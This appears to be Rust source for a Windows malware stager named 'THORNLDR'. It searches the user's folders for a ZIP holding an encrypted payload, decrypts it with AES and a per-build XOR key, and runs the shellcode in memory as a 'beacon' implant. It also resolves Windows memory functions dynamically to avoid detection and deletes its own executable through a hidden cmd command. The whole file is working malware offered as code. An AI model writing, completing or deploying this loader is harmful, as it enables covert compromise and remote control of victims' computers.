mod config;
mod dynload;

use aes::Aes256;
use cbc::cipher::{block_padding::Pkcs7, BlockDecryptMut, KeyIvInit};
use std::ffi::c_void;
use std::os::windows::process::CommandExt;

type Aes256CbcDec = cbc::Decryptor<Aes256>;
const CREATE_NO_WINDOW: u32 = 0x0800_0000;
const MEM_COMMIT_RESERVE: u32 = 0x3000;
const PAGE_READWRITE:     u32 = 0x04;
const PAGE_EXECUTE_READ:  u32 = 0x20;

fn self_delete() {
    if let Ok(path) = std::env::current_exe() {
        let cmd = format!("ping -n 3 127.0.0.1 >nul && del /f /q \"{}\"", path.display());
        let _ = std::process::Command::new("cmd")
            .args(["/c", &cmd])
            .creation_flags(CREATE_NO_WINDOW)
            .spawn();
    }
}

/// Decode a THORNLDR blob that contains a per-build XOR decoder stub.
///
/// The builder XOR-encrypts the stub+PE region (blob[56..pe_offset+pe_size])
/// and places a 40-byte in-shellcode decoder at blob[16..56].  That decoder
/// would modify the memory region in-place at runtime, but the region has
/// already been set to PAGE_EXECUTE_READ before the thread starts — writing
/// to it causes an immediate access violation.
///
/// Instead we decrypt here in the stager's own RW memory, then patch the
/// header JMP (byte 1) from 0x0E (→ decoder at blob[16]) to 0x36 (→ stub
/// directly at blob[56]), so the thread bypasses the now-irrelevant decoder.
///
/// Blobs without the XOR header (byte 0 != 0xEB or byte 1 != 0x0E) are
/// returned as-is for backwards compatibility.
fn decode_blob(encrypted: &[u8]) -> Vec<u8> {
    if encrypted.len() < 56 || encrypted[0] != 0xEB || encrypted[1] != 0x0E {
        return encrypted.to_vec();
    }
    // XOR key lives at decoder offset 29 = blob offset 45.
    let xor_key   = encrypted[45];
    let pe_offset = u32::from_le_bytes(encrypted[8..12].try_into().unwrap_or([0; 4])) as usize;
    let pe_size   = u32::from_le_bytes(encrypted[12..16].try_into().unwrap_or([0; 4])) as usize;
    let decode_end = pe_offset.saturating_add(pe_size);

    let mut blob = encrypted.to_vec();
    if decode_end <= blob.len() {
        for b in &mut blob[56..decode_end] {
            *b ^= xor_key;
        }
    }
    // JMP rel8 from offset 0: target = 2 + displacement.
    // 56 - 2 = 54 = 0x36  →  jumps directly to stub, skipping decoder.
    blob[1] = 0x36;
    blob
}

fn main() {
    // Collect candidate ZIP paths from common user directories
    let mut search_dirs: Vec<std::path::PathBuf> = Vec::new();
    if let Ok(profile) = std::env::var("USERPROFILE") {
        let base = std::path::PathBuf::from(&profile);
        search_dirs.push(base.join("Downloads"));
        search_dirs.push(base.join("Desktop"));
        search_dirs.push(base.join("Documents"));
    }
    if let Ok(tmp) = std::env::var("TEMP") {
        search_dirs.push(std::path::PathBuf::from(tmp));
    }
    if let Ok(exe) = std::env::current_exe() {
        if let Some(dir) = exe.parent() {
            search_dirs.push(dir.to_path_buf());
        }
    }

    let zip_candidates: Vec<std::path::PathBuf> = search_dirs.iter()
        .filter_map(|dir| std::fs::read_dir(dir).ok())
        .flat_map(|entries| entries.filter_map(|e| e.ok()).map(|e| e.path()))
        .filter(|p| p.extension().and_then(|x| x.to_str()) == Some("zip"))
        .collect();

    // Find the first ZIP containing the THORNPLD magic
    const MAGIC: &[u8] = b"THORNPLD";
    let (zip_bytes, pos) = match zip_candidates.iter()
        .filter_map(|p| std::fs::read(p).ok())
        .find_map(|bytes| {
            bytes.windows(8).position(|w| w == MAGIC).map(|pos| (bytes, pos))
        })
    {
        Some(pair) => pair,
        None => return,
    };

    let len = u32::from_le_bytes(zip_bytes[pos+8..pos+12].try_into().unwrap_or([0;4])) as usize;
    let encrypted = &zip_bytes[pos+12..pos+12+len];
    let (key, iv) = unsafe { (config::STAGER_CONFIG.key(), config::STAGER_CONFIG.iv()) };
    let mut dec_buf = encrypted.to_vec();
    let shellcode = match Aes256CbcDec::new(key.into(), iv.into())
        .decrypt_padded_mut::<Pkcs7>(&mut dec_buf)
    {
        Ok(sc)  => decode_blob(sc),
        Err(_)  => return,
    };

    // Schedule self-deletion now — the stager binary file is no longer needed.
    // The ping delay gives the loader time to map the implant before cmd.exe runs.
    self_delete();

    // Execute shellcode inline: this thread becomes the loader thread.
    // VirtualAlloc RW → copy → VirtualProtect RX → call.
    // Never reaches RWX.  Returns only if the payload exits gracefully.
    unsafe { exec_inline(&shellcode) };
}

unsafe fn exec_inline(sc: &[u8]) {
    let fn_va = match dynload::virtual_alloc()   { Some(f) => f, None => return };
    let fn_vp = match dynload::virtual_protect() { Some(f) => f, None => return };

    let mem = fn_va(std::ptr::null_mut(), sc.len(), MEM_COMMIT_RESERVE, PAGE_READWRITE);
    if mem.is_null() { return; }

    std::ptr::copy_nonoverlapping(sc.as_ptr(), mem as *mut u8, sc.len());

    let mut old: u32 = 0;
    fn_vp(mem, sc.len(), PAGE_EXECUTE_READ, &mut old);

    // Call the shellcode as a Windows thread start routine in this thread.
    // The THORNLDR stub resolves the beacon entry point and loops indefinitely.
    let shellcode_fn: unsafe extern "system" fn(*mut c_void) -> u32 =
        std::mem::transmute(mem);
    shellcode_fn(std::ptr::null_mut());
}
